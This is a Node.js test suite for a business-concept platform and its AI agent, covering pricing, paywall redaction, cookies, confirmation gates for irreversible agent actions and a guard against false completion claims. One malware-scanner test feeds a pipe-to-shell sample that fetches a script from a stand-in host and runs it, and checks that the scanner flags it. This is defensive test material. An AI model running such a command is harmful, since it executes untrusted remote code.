const { test } = require('node:test');
const assert = require('node:assert');
const money = require('../src/lib/money');
const { classifySection, assessCoverage } = require('../src/services/clay/interpreter');

test('platform take is 20%', () => {
  assert.strictEqual(money.platformFeeCents(10000), 2000);
  assert.strictEqual(money.sellerNetCents(10000), 8000);
});

test('$10 price floor is enforced', () => {
  assert.strictEqual(money.PRICE_FLOOR_CENTS, 1000);
  assert.strictEqual(money.isAboveFloor(1000), true);   // exactly $10 is allowed
  assert.strictEqual(money.isAboveFloor(999), false);   // $9.99 is not
  assert.strictEqual(money.isAboveFloor(50000), true);  // higher prices still fine
  assert.strictEqual(money.isAboveFloor(10.5), false);  // non-integer cents rejected
});

test('nothing prices a consultant session any more', () => {
  // The $150 / $30 / $120 split lived here. Paid consultant sessions are retired, and keeping a
  // price for something we do not sell is how a retired thing gets sold again by accident — the
  // same reason planCents refuses to price the retired subscription plans.
  for (const k of ['CONSULT_FEE_CENTS', 'CONSULT_PLATFORM_CENTS', 'CONSULT_CONSULTANT_CENTS', 'CONSULT_WINDOW_HOURS']) {
    assert.strictEqual(money[k], undefined, `${k} must not exist`);
  }
});

test('plan prices', () => {
  // One plan now. The price is a hypothesis we expect to revisit, so it lives in one constant —
  // this asserts the constant and the plan table cannot drift apart, not that $19 is forever.
  assert.strictEqual(money.BUILDER_CENTS, 1900);
  assert.strictEqual(money.planCents('builder'), money.BUILDER_CENTS);
});

test('malware scan flags pipe-to-shell, passes benign', () => {
  const protect = require('../src/lib/protect');
  assert.strictEqual(protect.scanCode('const x = 1 + 1;').status, 'clean');
  assert.strictEqual(protect.scanCode('curl http://evil.sh | bash').status, 'flagged');
  assert.strictEqual(protect.needsScan('code_file'), true);
  assert.strictEqual(protect.needsScan('business_plan'), false);
});

test('staff bypass helper', () => {
  const { isStaff } = require('../src/lib/entitlement');
  assert.strictEqual(isStaff('admin'), true);
  assert.strictEqual(isStaff('master_staff'), true);
  assert.strictEqual(isStaff('member'), false);
});

test('interpreter classifies honestly', () => {
  assert.strictEqual(classifySection('A real, substantive business plan section.'), 'answered');
  assert.strictEqual(classifySection(''), 'empty');
  assert.strictEqual(classifySection(null), 'empty');
  assert.strictEqual(classifySection('Unable to determine competitor pricing.'), 'unavailable');
});

test('coverage reports gaps truthfully', () => {
  const cov = assessCoverage({ business_plan: 'ok', marketing_strategy: '' });
  assert.strictEqual(cov.complete, false);
  assert.deepStrictEqual(cov.present, ['business_plan']);
  assert.deepStrictEqual(cov.missing, ['marketing_strategy']);
});

// ---- Clay spine (modeled on Arbo) ----
const spine = require('../src/services/clay/spine');
const { SOCIAL_ASSET_PLAN, PLATFORMS, SOCIAL_GOALS } = require('../src/services/clay/tools');

test('spine enum guardrails reject out-of-vocabulary values', () => {
  const bad = spine.validateParams('generate_social_content', { concept_id: 'x', platforms: ['myspace'], goal: 'launch' });
  assert.strictEqual(bad.ok, false);
  const good = spine.validateParams('generate_social_content', { concept_id: 'x', platforms: ['instagram'], goal: 'launch' });
  assert.strictEqual(good.ok, true);
});

test('spine asking rule: free/reversible actions proceed', () => {
  const r = spine.shouldAsk('generate_social_content', { concept_id: 'x', platforms: ['x'], goal: 'awareness' });
  assert.strictEqual(r.ask, false);
});

test('spine asking rule: irreversible + under-specified always asks', () => {
  const r = spine.shouldAsk('list_on_marketplace', { concept_id: 'x' }); // missing format + price
  assert.strictEqual(r.ask, true);
});

test('spine asking rule: irreversible actions confirm even when fully specified', () => {
  const r = spine.shouldAsk('purchase_concept', { listing_id: 'x' });
  assert.strictEqual(r.ask, true);
  assert.strictEqual(spine.requiresConfirmation('purchase_concept'), true);
  // Building a full project is gated too: it is minutes of work and a whole set of materials, so
  // the person approves it first (that approval is also their way to STOP an unwanted build).
  assert.strictEqual(spine.requiresConfirmation('generate_concept'), true);
  assert.strictEqual(spine.requiresConfirmation('search_marketplace'), false);
});

test('social asset plan matches controlled vocabulary', () => {
  const types = SOCIAL_ASSET_PLAN.map((a) => a.type).sort();
  assert.deepStrictEqual(types, ['content_calendar', 'image_prompt', 'social_post', 'social_template', 'video_script']);
  assert.ok(PLATFORMS.includes('instagram') && SOCIAL_GOALS.includes('launch'));
});

// ---- HTML demo describer + accessibility audit ----
const describe_ = require('../src/lib/describe');

test('describer flags real accessibility problems', () => {
  const bad = describe_.outline('<html><body><div onclick="go()">Go</div><input><img src=x></body></html>');
  assert.strictEqual(bad.a11y.ok, false);
  assert.ok(bad.a11y.issues.some((i) => i.includes('lang')));
  assert.ok(bad.a11y.issues.some((i) => i.includes('divs/spans')));
  assert.ok(bad.a11y.issues.some((i) => i.toLowerCase().includes('alt')));
});

test('describer passes an accessible demo and outlines structure', () => {
  const good = describe_.outline('<html lang="en"><head><title>Shop</title></head><body><header><nav><a href="/">Home</a></nav></header><main><h1>Welcome</h1><label for="e">Email</label><input id="e"><button>Sign up</button><img src="x" alt="a product"></main></body></html>');
  assert.strictEqual(good.a11y.ok, true);
  assert.ok(good.items.length >= 3);
  assert.strictEqual(good.title, 'Shop');
});

// ---- Clay conversational agent (spine-driven safety) ----
const agent = require('../src/services/clay/agent');

test('agent tool schemas carry enum guardrails', () => {
  const schemas = agent.toolSchemas();
  const names = schemas.map((s) => s.name);
  assert.ok(names.includes('generate_social_content') && names.includes('purchase_concept'));
  const social = schemas.find((s) => s.name === 'generate_social_content');
  assert.ok(social.input_schema.properties.platforms.items.enum.includes('instagram'));
});

test('agent never auto-runs irreversible actions; confirmation unlocks them', () => {
  assert.strictEqual(agent.planToolInvocation('purchase_concept', { listing_id: 'x' }).action, 'confirm');
  assert.strictEqual(agent.planToolInvocation('list_on_marketplace', { concept_id: 'x', format: 'flat', price: 5000 }).action, 'confirm');
  assert.strictEqual(agent.planToolInvocation('remove_concept', { concept_id: 'x' }).action, 'confirm');
  assert.strictEqual(agent.planToolInvocation('purchase_concept', { listing_id: 'x' }, { confirmed: true }).action, 'execute');
});

test('agent runs reversible actions and rejects bad enums', () => {
  assert.strictEqual(agent.planToolInvocation('search_marketplace', { query: 'tutoring' }).action, 'execute');
  // A build is a PROPOSAL now — it asks before it starts.
  assert.strictEqual(agent.planToolInvocation('generate_concept', { prompt: 'a tutoring service' }).action, 'confirm');
  assert.strictEqual(agent.planToolInvocation('generate_concept', { prompt: 'a tutoring service' }, { confirmed: true }).action, 'execute');
  assert.strictEqual(agent.planToolInvocation('list_on_marketplace', { concept_id: 'x', format: 'barter', price: 5000 }).action, 'reject');
});

test('make_image is a registered, reversible tool with a boolean hero-placement flag', () => {
  assert.ok(spine.TOOLS.make_image, 'make_image is a registered tool');
  assert.ok(spine.TOOLS.make_image.required.includes('concept_id'));
  assert.ok(spine.TOOLS.make_image.optional.includes('place_as_hero'));
  assert.strictEqual(spine.requiresConfirmation('make_image'), false);
  const schema = agent.toolSchemas().find((s) => s.name === 'make_image');
  assert.ok(schema, 'make_image is offered to the model');
  assert.strictEqual(schema.input_schema.properties.place_as_hero.type, 'boolean');
  // A creator making an image is reversible and safe to run without a confirmation gate.
  assert.strictEqual(agent.planToolInvocation('make_image', { concept_id: 'x' }).action, 'execute');
});

// ---- Clay model provider selection ----
const provider = require('../src/services/clay/provider');

test('provider prefers OpenAI, falls back to Anthropic, else unavailable', () => {
  const save = { o: process.env.OPENAI_API_KEY, a: process.env.ANTHROPIC_API_KEY };
  delete process.env.OPENAI_API_KEY; delete process.env.ANTHROPIC_API_KEY;
  assert.strictEqual(provider.available(), false);
  assert.strictEqual(provider.providerName(), null);
  process.env.ANTHROPIC_API_KEY = 'x';
  assert.strictEqual(provider.providerName(), 'anthropic');
  process.env.OPENAI_API_KEY = 'y';
  assert.strictEqual(provider.providerName(), 'openai');
  if (save.o) process.env.OPENAI_API_KEY = save.o; else delete process.env.OPENAI_API_KEY;
  if (save.a) process.env.ANTHROPIC_API_KEY = save.a; else delete process.env.ANTHROPIC_API_KEY;
});

test('agent keeps the conversation well-formed when it stops to confirm', async () => {
  const provider = require('../src/services/clay/provider');
  const origAvail = provider.available, origChat = provider.chat;
  provider.available = () => true;
  provider.chat = async () => ({
    ok: true, text: 'Want me to remove that?',
    tool_calls: [{ id: 'tc_1', name: 'remove_concept', input: { concept_id: 'c1' } }],
  });
  try {
    const out = await agent.runChat({ messages: [{ role: 'user', content: 'delete concept c1' }], executors: {} });
    assert.strictEqual(out.status, 'confirmation_required');
    // Every tool_call in the replayable convo must have a matching tool result,
    // or the provider rejects the next turn.
    const calls = out.messages.flatMap((m) => (m.tool_calls || []).map((t) => t.id));
    const results = out.messages.filter((m) => m.role === 'tool').map((m) => m.tool_call_id);
    assert.ok(calls.includes('tc_1'));
    for (const id of calls) assert.ok(results.includes(id), 'dangling tool_call: ' + id);
  } finally {
    provider.available = origAvail; provider.chat = origChat;
  }
});

test('research is a reversible read-only tool that requires a query', () => {
  assert.strictEqual(agent.planToolInvocation('research', { query: 'tutoring market size' }).action, 'execute');
  assert.strictEqual(agent.planToolInvocation('research', {}).action, 'reject');
});

test('research degrades honestly with no search backend configured', async () => {
  const research = require('../src/services/clay/research');
  const save = process.env.SEARCH_API_KEY;
  delete process.env.SEARCH_API_KEY;
  assert.strictEqual(research.available(), false);
  const r = await research.search('anything at all');
  assert.strictEqual(r.available, false);
  assert.deepStrictEqual(r.results, []);
  if (save) process.env.SEARCH_API_KEY = save;
});

test('read_source is a reversible read-only tool that requires a url', () => {
  assert.strictEqual(agent.planToolInvocation('read_source', { url: 'https://example.com' }).action, 'execute');
  assert.strictEqual(agent.planToolInvocation('read_source', {}).action, 'reject');
});

test('research.extract degrades honestly with no backend', async () => {
  const research = require('../src/services/clay/research');
  const save = process.env.SEARCH_API_KEY;
  delete process.env.SEARCH_API_KEY;
  const r = await research.extract('https://example.com');
  assert.strictEqual(r.available, false);
  if (save) process.env.SEARCH_API_KEY = save;
});

test('source self-check short-circuits honestly with no sources (no false clean bill)', async () => {
  const clay = require('../src/services/clay');
  assert.strictEqual(await clay.selfCheckSources({ customer_research: 'x' }, []), null);
  assert.strictEqual(await clay.selfCheckSources({}, [{ title: 't', url: 'u', snippet: 's' }]), null);
});

test('waitlist email validation and ref-code shape', () => {
  const wl = require('../src/routes/waitlist');
  assert.ok(wl.EMAIL_RE.test('a@b.co'));
  assert.ok(wl.EMAIL_RE.test('first.last@sub.domain.io'));
  assert.ok(!wl.EMAIL_RE.test('nope'));
  assert.ok(!wl.EMAIL_RE.test('a@b'));
  assert.ok(!wl.EMAIL_RE.test('a b@c.co'));
  assert.match(wl.refCode(), /^[a-f0-9]{8}$/);
  assert.notStrictEqual(wl.refCode(), wl.refCode());
});

test('cookies parse header into map', () => {
  const { parseCookies } = require('../src/lib/cookies');
  const c = parseCookies({ headers: { cookie: 'a=1; ypl_v=abc%2Ddef; x=y' } });
  assert.strictEqual(c.ypl_v, 'abc-def');
  assert.strictEqual(c.a, '1');
  assert.deepStrictEqual(parseCookies({ headers: {} }), {});
});

test('visitor shapeTeaser sanitizes provider JSON and rejects junk', async () => {
  const provider = require('../src/services/clay/provider');
  const visitor = require('../src/routes/visitor');
  const oa = provider.available, oc = provider.chat;
  try {
    provider.available = () => true;
    provider.chat = async () => ({ ok: true, text: '{"title":"Dog Yoga Co","angle":"Calm classes for anxious dogs","inside":["Market research","Pricing model","Waitlist page"]}' });
    const t = await visitor.shapeTeaser('yoga for dogs');
    assert.strictEqual(t.title, 'Dog Yoga Co');
    assert.strictEqual(t.inside.length, 3);
    provider.chat = async () => ({ ok: true, text: 'not json at all' });
    assert.strictEqual(await visitor.shapeTeaser('x'), null);
  } finally { provider.available = oa; provider.chat = oc; }
});

test('clay journal recordRun never throws (best-effort audit)', async () => {
  const journal = require('../src/services/clay/journal');
  await assert.doesNotReject(journal.recordRun({ kind: 'generate', resultStatus: 'answered', mode: 'create', sourceCount: 3 }));
  await assert.doesNotReject(journal.recordRun({}));
});

test('retrieval relatedConcepts guards and never throws', async () => {
  const retrieval = require('../src/services/clay/retrieval');
  assert.deepStrictEqual(await retrieval.relatedConcepts(null, 'anything'), []);
  assert.deepStrictEqual(await retrieval.relatedConcepts('u', ''), []);
  assert.deepStrictEqual(await retrieval.relatedConcepts('u', 'ab'), []);
  await assert.doesNotReject(retrieval.relatedConcepts('00000000-0000-0000-0000-000000000000', 'coffee subscription box'));
});

test('embeddings: unavailable without a key, and vector literal formats', async () => {
  const emb = require('../src/services/clay/retrieval-embeddings');
  const had = process.env.OPENAI_API_KEY;
  delete process.env.OPENAI_API_KEY;
  assert.strictEqual(emb.available(), false);
  assert.strictEqual(await emb.embed('hello world'), null);
  assert.strictEqual(emb.toVectorLiteral([0.1, 0.2, 0.3]), '[0.1,0.2,0.3]');
  if (had) process.env.OPENAI_API_KEY = had;
});

test('clay health assess uses honest thresholds', () => {
  const { assess } = require('../src/services/clay/health');
  assert.strictEqual(assess({ total: 2, answered: 2, provider_down: 0, failed: 0 }).alert, false);
  assert.strictEqual(assess({ total: 10, answered: 9, provider_down: 0, failed: 1 }).alert, false);
  assert.strictEqual(assess({ total: 10, answered: 3, provider_down: 0, failed: 7 }).alert, true);
  assert.strictEqual(assess({ total: 10, answered: 8, provider_down: 2, failed: 2 }).alert, true);
});

test('money path: plan prices are locked and match the webhook write', () => {
  const { PLANS, planCents, FREE_PROJECTS } = require('../src/lib/money');
  assert.strictEqual(planCents('builder'), 1900);            // $19.00
  assert.strictEqual(PLANS.builder.per_concept, false);      // never charged per project again
  assert.strictEqual(FREE_PROJECTS, 1);                      // the first project is free, in full
  // The retired plans must no longer be sellable — an old price cannot be charged by accident.
  assert.strictEqual(planCents('maker'), null);
  assert.strictEqual(planCents('sculptor'), null);
  assert.strictEqual(planCents('nope'), null);
});

// --- Adaptive reasoning effort: Clay scales thinking power to the task ---
const clayProvider = require('../src/services/clay/provider');

test('adaptive effort: trivial tasks stay on low', () => {
  // tiny probe-style call
  assert.strictEqual(clayProvider.autoEffort({ maxTokens: 64, inputChars: 20 }), 'low');
  // short teaser
  assert.strictEqual(clayProvider.autoEffort({ maxTokens: 600, inputChars: 200 }), 'low');
});

test('adaptive effort: large generation stays low (generation work, not reasoning work)', () => {
  // full concept build: 12k token budget, json, substantial prompt — it should generate
  // fast on low reasoning, not burn time on deep reasoning it doesn't need.
  assert.strictEqual(clayProvider.autoEffort({ maxTokens: 12000, json: true, inputChars: 5000 }), 'low');
});

test('adaptive effort: moderate analysis lands on medium', () => {
  assert.strictEqual(clayProvider.autoEffort({ maxTokens: 5000, inputChars: 4000 }), 'medium');
});

test('adaptive effort: dense input with compact output earns high', () => {
  // hard analysis / validation: lots to weigh, little to write
  assert.strictEqual(clayProvider.autoEffort({ maxTokens: 2000, inputChars: 9000 }), 'high');
});

test('adaptive effort: OPENAI_REASONING_EFFORT acts as a ceiling, never a floor', () => {
  const prev = process.env.OPENAI_REASONING_EFFORT;
  // Note: resolveEffort reads the module-captured const, so we assert the clamp logic
  // via an explicit effort that exceeds a lower auto pick instead of mutating env here.
  // An explicit effort is honored when no lower ceiling applies:
  assert.strictEqual(clayProvider.resolveEffort({ maxTokens: 64, inputChars: 10, effort: 'high' }), 'high');
  process.env.OPENAI_REASONING_EFFORT = prev;
});

// --- billingExempt: staff never pay, unless flagged for real-flow testing ---
test('billingExempt: staff are exempt unless billing_test is set', () => {
  const ent = require('../src/lib/entitlement');
  assert.strictEqual(ent.billingExempt({ role: 'master_staff' }), true);
  assert.strictEqual(ent.billingExempt({ role: 'admin' }), true);
  assert.strictEqual(ent.billingExempt({ role: 'master_staff', billing_test: true }), false); // founder testing
  assert.strictEqual(ent.billingExempt({ role: 'user' }), false);
  assert.strictEqual(ent.billingExempt({ role: 'user', billing_test: true }), false);
  assert.strictEqual(ent.billingExempt(null), false);
});

// --- paywall backstop: locked asset bodies must never leave the server for a non-entitled user ---
test('redactLockedAssets blanks non-preview bodies unless entitled, keeps metadata', () => {
  const ent = require('../src/lib/entitlement');
  const assets = [
    { id: '1', type: 'business_plan', title: 'Plan', body: 'FULL PLAN' },
    { id: '2', type: 'marketing_strategy', title: 'Mkt', body: 'FULL MKT' },
    { id: '3', type: 'html_demo', title: 'Demo', body: '<html>' },
    { id: '4', type: 'customer_research', title: 'Research', body: 'SECRET RESEARCH' },
    { id: '5', type: 'money_flow', title: 'Money', body: 'SECRET MONEY' },
  ];
  const red = ent.redactLockedAssets(assets, false);
  assert.strictEqual(red[0].body, 'FULL PLAN');   // preview stays
  assert.strictEqual(red[2].body, '<html>');      // preview stays
  assert.strictEqual(red[3].body, '');            // locked body blanked
  assert.strictEqual(red[3].locked, true);
  assert.strictEqual(red[4].body, '');
  assert.strictEqual(red[3].id, '4');             // metadata preserved for listing
  assert.strictEqual(red[3].title, 'Research');
  const full = ent.redactLockedAssets(assets, true);
  assert.strictEqual(full[3].body, 'SECRET RESEARCH'); // entitled: nothing redacted
  assert.strictEqual(full[4].body, 'SECRET MONEY');
  assert.deepStrictEqual(ent.redactLockedAssets(null, false), []); // null-safe
});

test('preview types are exactly the four free pieces', () => {
  const ent = require('../src/lib/entitlement');
  assert.deepStrictEqual(ent.PREVIEW_TYPES.slice().sort(),
    ['built_site', 'business_plan', 'html_demo', 'marketing_strategy']);
  assert.strictEqual(ent.isPreviewType('business_plan'), true);
  assert.strictEqual(ent.isPreviewType('money_flow'), false);
});

// --- session cookie: the refresh cookie must be HttpOnly + SameSite, scoped, with a Max-Age ---
test('setCookie sets HttpOnly, SameSite=Lax, path and max-age', () => {
  const { setCookie } = require('../src/lib/cookies');
  const headers = {};
  const res = { getHeader: (k) => headers[k], setHeader: (k, v) => { headers[k] = v; } };
  setCookie(res, 'kiln_rt', 'tok123', { path: '/api/auth', maxAge: 60 * 60 * 24 * 30 });
  const c = headers['Set-Cookie'];
  const cookie = Array.isArray(c) ? c[0] : c;
  assert.ok(/kiln_rt=tok123/.test(cookie));
  assert.ok(/HttpOnly/.test(cookie));
  assert.ok(/SameSite=Lax/.test(cookie));
  assert.ok(/Path=\/api\/auth/.test(cookie));
  assert.ok(/Max-Age=2592000/.test(cookie));
});

test('setCookie appends multiple cookies rather than clobbering', () => {
  const { setCookie } = require('../src/lib/cookies');
  const headers = {};
  const res = { getHeader: (k) => headers[k], setHeader: (k, v) => { headers[k] = v; } };
  setCookie(res, 'a', '1', {});
  setCookie(res, 'b', '2', {});
  assert.ok(Array.isArray(headers['Set-Cookie']));
  assert.strictEqual(headers['Set-Cookie'].length, 2);
});

// --- background sweeps: honest, safe thresholds ---
test('stale-build threshold sits well beyond any real build', () => {
  const builds = require('../src/services/builds');
  assert.strictEqual(typeof builds.sweepStaleBuilds, 'function');
  assert.ok(builds.STALE_AFTER_MIN >= 8); // model call caps ~3 min; client stops watching ~6 min
});

test('concept expiry always warns before it expires', () => {
  const exp = require('../src/services/expiry');
  assert.ok(exp.REMIND_AFTER_DAYS < exp.EXPIRE_AFTER_DAYS);
  assert.strictEqual(typeof exp.runExpirySweep, 'function');
});

// --- the retired consultant checkout is gone, not merely unreachable ---
test('no code path can open a checkout for a consultant session', () => {
  const stripe = require('../src/services/stripe');
  // This opened a real $150 Stripe checkout. The routes calling it returned 410, so nothing reached
  // it — but a working payment function for a product we no longer sell is a live wire behind a
  // closed door, and the door was the only thing stopping it. Deleting it is what makes the
  // retirement real: a later cleanup that removes the gate cannot bring the charge back.
  assert.strictEqual(stripe.createConsultCheckout, undefined);
  const src = require('fs').readFileSync(require.resolve('../src/services/stripe.js'), 'utf8');
  assert.ok(!/async function createConsultCheckout/.test(src));
  // And nothing anywhere still calls it.
  const files = require('fs').readdirSync('src/routes').map((f) => 'src/routes/' + f)
    .filter((f) => f.endsWith('.js'));
  // Comments stripped first: the property is that no CODE calls it, not that the name is never
  // written down. The retired router explains what it used to do, and that explanation is the
  // reason the deletion is understandable later.
  const codeOnly = (t) => t.replace(/\/\*[\s\S]*?\*\//g, ' ').replace(/^\s*\/\/.*$/gm, ' ');
  for (const f of files) {
    assert.ok(!/createConsultCheckout/.test(codeOnly(require('fs').readFileSync(f, 'utf8'))),
      f + ' still calls it');
  }
});

// ---- file ingestion (Clay accepting user files) ----
test('ingest classifies code, data, text, image, and binary', () => {
  const ingest = require('../src/lib/ingest');
  const code = Buffer.from('function hi(){ return 1; }\n', 'utf8');
  assert.strictEqual(ingest.classify('app.js', 'text/javascript', code), 'code');
  assert.strictEqual(ingest.classify('data.json', 'application/json', Buffer.from('{"a":1}', 'utf8')), 'data');
  assert.strictEqual(ingest.classify('notes.md', null, Buffer.from('# Hi', 'utf8')), 'text');
  // image by mime and by extension
  assert.strictEqual(ingest.classify('logo.png', 'image/png', Buffer.from([0x89, 0x50, 0x4e, 0x47])), 'image');
  assert.strictEqual(ingest.classify('pic', 'image/jpeg', Buffer.from([1, 2, 3])), 'image');
  // real binary (has NUL bytes) -> not readable as text
  assert.strictEqual(ingest.classify('blob.bin', 'application/octet-stream', Buffer.from([0x00, 0x01, 0x02, 0x00])), 'binary');
});

test('ingest isProbablyText rejects NUL bytes, accepts clean utf8', () => {
  const ingest = require('../src/lib/ingest');
  assert.strictEqual(ingest.isProbablyText(Buffer.from('hello world\n', 'utf8')), true);
  assert.strictEqual(ingest.isProbablyText(Buffer.from([0x00, 0x41, 0x42])), false);
  assert.strictEqual(ingest.isProbablyText(Buffer.alloc(0)), false);
});

test('ingest extractText strips BOM and caps length', () => {
  const ingest = require('../src/lib/ingest');
  const withBom = Buffer.from('\uFEFFhello', 'utf8');
  assert.strictEqual(ingest.extractText(withBom), 'hello');
  const big = Buffer.from('x'.repeat(ingest.MAX_TEXT_CHARS + 500), 'utf8');
  const out = ingest.extractText(big);
  assert.ok(out.length <= ingest.MAX_TEXT_CHARS + 20);
  assert.ok(out.endsWith('[truncated]'));
});

test('ingest outcomeLine is honest per read status', () => {
  const ingest = require('../src/lib/ingest');
  assert.match(ingest.outcomeLine({ filename: 'a.js', kind: 'code', read_status: 'read', chars: 100 }), /read as code/);
  assert.match(ingest.outcomeLine({ filename: 'logo.png', read_status: 'described' }), /image and described/);
  assert.match(ingest.outcomeLine({ filename: 'x.bin', read_status: 'unreadable' }), /without guessing/);
  assert.match(ingest.outcomeLine({ filename: 'big.zip', skipped: 'too_large' }), /too large/);
});

test('ingest classifies pdf (magic + ext) and docx', () => {
  const ingest = require('../src/lib/ingest');
  const pdfMagic = Buffer.from('%PDF-1.4\n...', 'utf8');
  assert.strictEqual(ingest.classify('paper.pdf', 'application/pdf', pdfMagic), 'pdf');
  assert.strictEqual(ingest.classify('noext', null, pdfMagic), 'pdf'); // magic bytes win
  assert.strictEqual(ingest.classify('brief.docx',
    'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    Buffer.from([0x50, 0x4b, 0x03, 0x04])), 'doc');
  // legacy .doc is not extractable -> falls through to binary
  assert.strictEqual(ingest.classify('old.doc', 'application/msword', Buffer.from([0x00, 0x01, 0x02, 0x00])), 'binary');
});

test('docextract fails honestly on junk, never throws', async () => {
  const d = require('../src/lib/docextract');
  const pdf = await d.extractPdf(Buffer.from('not a pdf'));
  assert.strictEqual(pdf.ok, false);
  const doc = await d.extractDocx(Buffer.from('not a docx'));
  assert.strictEqual(doc.ok, false);
});

test('renderConceptContext grounds Clay in the concept being edited', () => {
  const block = agent.renderConceptContext({
    concept: { id: 'concept-123', title: 'Neighborhood Tool Library', category: 'remote_service', stage: 'concept', risk_summary: 'licensing varies by city' },
    assets: [{ type: 'business_plan', title: 'Plan', body: 'Members pay $12/mo to borrow tools.' }],
  });
  // It must carry the real id, the real content, and steer edits through enhance_concept.
  assert.ok(block.includes('concept-123'), 'includes concept id');
  assert.ok(block.includes('Neighborhood Tool Library'), 'includes title');
  assert.ok(block.includes('Members pay $12/mo'), 'includes current content');
  assert.ok(block.includes('enhance_concept'), 'tells Clay how to make edits');
  // Empty concept still renders safely.
  const empty = agent.renderConceptContext({ concept: { id: 'c0', title: 'X' }, assets: [] });
  assert.ok(empty.includes('No materials built yet'), 'handles no materials');
});

test('renderConceptContext never leaks a locked section', () => {
  const block = agent.renderConceptContext({
    concept: { id: 'c9', title: 'Secret Sauce Co' },
    assets: [
      { type: 'business_plan', title: 'Plan', body: 'Freely previewable summary.' },
      { type: 'build_path', title: 'Build Path', body: '', locked: true },
    ],
  });
  assert.ok(block.includes('Freely previewable summary'), 'preview content is shown');
  assert.ok(block.includes('LOCKED'), 'locked section is marked locked');
  assert.ok(block.includes('never reveal or invent'), 'Clay is told not to reveal it');
});

// ---- Clay research via OpenAI's own web_search (no separate service) ----
const wsProvider = require('../src/services/clay/provider');
const wsResearch = require('../src/services/clay/research');

test('parseOpenAISearch pulls the synthesis and real cited sources', () => {
  const resp = {
    output: [
      { type: 'web_search_call', status: 'completed', action: { type: 'search', query: 'furnished rental demand' } },
      { type: 'message', role: 'assistant', content: [
        { type: 'output_text', text: 'Demand for furnished rentals is rising in mid-size US metros.',
          annotations: [
            { type: 'url_citation', url: 'https://example.com/a', title: 'Market Report A' },
            { type: 'url_citation', url: 'https://example.com/b', title: 'Report B' },
            { type: 'url_citation', url: 'https://example.com/a', title: 'dup should dedupe' },
          ] },
      ] },
    ],
  };
  const r = wsProvider._parseOpenAISearch(resp);
  assert.strictEqual(r.searched, true);
  assert.strictEqual(r.results.length, 2); // deduped by url
  assert.strictEqual(r.results[0].url, 'https://example.com/a');
  assert.ok(/furnished rentals/i.test(r.answer));
});

test('parseOpenAISearch is honest when nothing was searched', () => {
  const r = wsProvider._parseOpenAISearch({ output: [] });
  assert.strictEqual(r.searched, false);
  assert.deepStrictEqual(r.results, []);
  assert.strictEqual(r.answer, null);
});

test('research is available on the OpenAI key alone — no separate search service', () => {
  const hadTavily = process.env.SEARCH_API_KEY;
  const hadOpenAI = process.env.OPENAI_API_KEY;
  delete process.env.SEARCH_API_KEY;
  process.env.OPENAI_API_KEY = 'sk-test';
  try {
    assert.strictEqual(wsResearch.available(), true); // OpenAI can web-search natively
  } finally {
    if (hadTavily === undefined) delete process.env.SEARCH_API_KEY; else process.env.SEARCH_API_KEY = hadTavily;
    if (hadOpenAI === undefined) delete process.env.OPENAI_API_KEY; else process.env.OPENAI_API_KEY = hadOpenAI;
  }
});

// ---- Clay's systems self-check tells the truth, never sugarcoats ----
const health = require('../src/services/clay/health');

test('systems summary reports a failed email as FAILED, not fine', () => {
  const s = {
    reasoning: { ok: true, provider: 'openai', model: 'gpt-5.5' },
    research: { ok: true, via: 'openai_web_search' },
    email: { configured: true, from: 'clay@accessyplabs.com', last: { sent: false, reason: 'resend_422: from not verified' } },
    payments: { secret_key: true, webhook_secret: true, events_recorded: 0 },
  };
  const out = health.summarizeSystems(s);
  assert.ok(/FAILED/.test(out), 'must flag the failed send');
  assert.ok(/resend_422/.test(out), 'must surface the real reason');
});

test('systems summary says customers cannot pay when Stripe key is absent', () => {
  const s = {
    reasoning: { ok: true, provider: 'openai', model: 'gpt-5.5' },
    research: { ok: true, via: 'openai_web_search' },
    email: { configured: true, from: 'x', last: { sent: true, reason: null } },
    payments: { secret_key: false, webhook_secret: false, events_recorded: null },
  };
  const out = health.summarizeSystems(s);
  assert.ok(/can't pay|cannot pay|NOT connected/i.test(out), 'must warn payments are down');
});

test('systems summary flags a missing brain and missing research', () => {
  const s = {
    reasoning: { ok: false, provider: null, model: null },
    research: { ok: false, via: null },
    email: { configured: false, from: 'x', last: null },
    payments: { secret_key: true, webhook_secret: false, events_recorded: 0 },
  };
  const out = health.summarizeSystems(s);
  assert.ok(/NOT connected/.test(out), 'brain down');
  assert.ok(/research is off/i.test(out), 'research down');
  assert.ok(/WEBHOOK SECRET is missing/i.test(out), 'webhook secret gap');
});

// ── Honesty guard (ported from Arbo's actionClaimGuard) ─────────────────────
const actionGuard = require('../src/services/clay/actionGuard');
const { CLAY_VERSION, CLAY_VERSION_LABEL } = require('../src/services/clay/version');

test('guard flags a false "I\'ve listed it on the marketplace" claim', () => {
  const issues = actionGuard.auditUnbackedClaims("Done! I've listed your concept on the marketplace for sale.", { backedActions: new Set() });
  assert.strictEqual(issues.length, 1);
  assert.strictEqual(issues[0].kind, 'listed');
});

test('guard flags "check your inbox" — Clay cannot email from chat', () => {
  const issues = actionGuard.auditUnbackedClaims("I've emailed the package to you — check your inbox.", { backedActions: new Set() });
  assert.ok(issues.some(i => i.kind === 'emailed'), 'emailed claim must be caught');
});

test('guard flags a completed-purchase claim', () => {
  const issues = actionGuard.auditUnbackedClaims("The purchase is complete — you now own it.", { backedActions: new Set() });
  assert.ok(issues.some(i => i.kind === 'purchased'));
});

test('a backed action suppresses the claim (tool truly ran)', () => {
  const backed = new Set(['removed']);
  const issues = actionGuard.auditUnbackedClaims("I've removed it from the marketplace.", { backedActions: backed });
  assert.strictEqual(issues.length, 0, 'a real removal this turn makes the claim true');
});

test('offers and futures are NOT flagged (I can / want me to)', () => {
  assert.strictEqual(actionGuard.claimedCompletedActions("I can list it on the marketplace whenever you're ready.").length, 0);
  assert.strictEqual(actionGuard.claimedCompletedActions("Want me to email it to you?").length, 0);
  assert.strictEqual(actionGuard.claimedCompletedActions("I'll list it for you once you confirm.").length, 0);
});

test('a truthful status readout is NOT flagged', () => {
  assert.strictEqual(actionGuard.claimedCompletedActions("Your concept is still a private draft — it isn't on the marketplace.").length, 0);
});

test('tool→class mapping: only irreversible tools back a class, email never does', () => {
  assert.strictEqual(actionGuard.actionClassForTool('list_on_marketplace'), 'listed');
  assert.strictEqual(actionGuard.actionClassForTool('purchase_concept'), 'purchased');
  assert.strictEqual(actionGuard.actionClassForTool('remove_concept'), 'removed');
  assert.strictEqual(actionGuard.actionClassForTool('generate_concept'), null);
});

test('correction and fallback text are honest and non-empty', () => {
  const issues = actionGuard.auditUnbackedClaims("I've listed it on the marketplace.", { backedActions: new Set() });
  assert.ok(/STOP/.test(actionGuard.buildCorrection(issues)));
